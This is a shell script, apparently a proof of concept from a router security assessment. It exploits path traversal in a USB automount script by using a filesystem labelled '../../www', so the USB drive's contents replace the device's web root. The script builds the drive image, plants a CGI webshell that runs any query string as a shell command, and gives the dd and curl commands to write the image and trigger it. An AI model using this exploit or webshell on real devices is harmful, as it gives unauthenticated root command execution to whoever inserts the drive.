#!/bin/sh
# M10 - USB automount filesystem-LABEL path traversal (physical).
# /etc/hotplug.d/block/10-mount does:  mkdir -p "$MOUNT_ROOT/$label" ; mount ... "$MOUNT_ROOT/$label"
# A filesystem labelled "../../www" resolves the mount point to /www and REPLACES the
# live web root. A CGI webshell on that FS = unauthenticated root RCE over HTTP.
#
# Build a drive image here, then write it to a real USB stick (e.g. /dev/diskN) and insert.
set -e
IMG="${1:-usb-www.img}"
SIZE_MB="${2:-16}"
LABEL="../../www"                       # <= 16 bytes, valid ext4 label
rm -f "$IMG"
dd if=/dev/zero of="$IMG" bs=1m count="$SIZE_MB"
# macOS: newfs_ext4 not available -> use Linux or e2fsprogs; label is set at mkfs time.
if command -v mkfs.ext4 >/dev/null 2>&1; then
  mkfs.ext4 -L "$LABEL" "$IMG"
else
  echo "[!] mkfs.ext4 not found (macOS). Do this on Linux/WSL with e2fsprogs, or install e2fsprogs."
  echo "    mkfs.ext4 -L '$LABEL' $IMG"
  exit 1
fi
MNT="$(mktemp -d)"
if [ "$(uname)" = "Linux" ]; then
  sudo mount -o loop "$IMG" "$MNT"
else
  echo "[!] mount the image manually (Linux loop mount or hdiutil with ext4 support)."
  echo "    mkdir -p $MNT && sudo mount -o loop $IMG $MNT"
  echo "    then create $MNT/cgi-bin/sh with the payload and unmount."; exit 0
fi
mkdir -p "$MNT/cgi-bin"
cat > "$MNT/cgi-bin/sh" <<'CGI'
#!/bin/sh
printf 'Content-Type: text/plain\n\n'
/bin/sh -c "$QUERY_STRING" 2>&1
CGI
chmod +x "$MNT/cgi-bin/sh"
sync; sudo umount "$MNT"
echo "[+] $IMG ready (label '$LABEL'). Write to USB then insert:
      Linux : sudo dd if=$IMG of=/dev/sdX bs=1M
      macOS : diskutil list ; sudo dd if=$IMG of=/dev/rdiskN bs=1m
      Then:    curl 'http://192.168.75.1/cgi-bin/sh?id'"
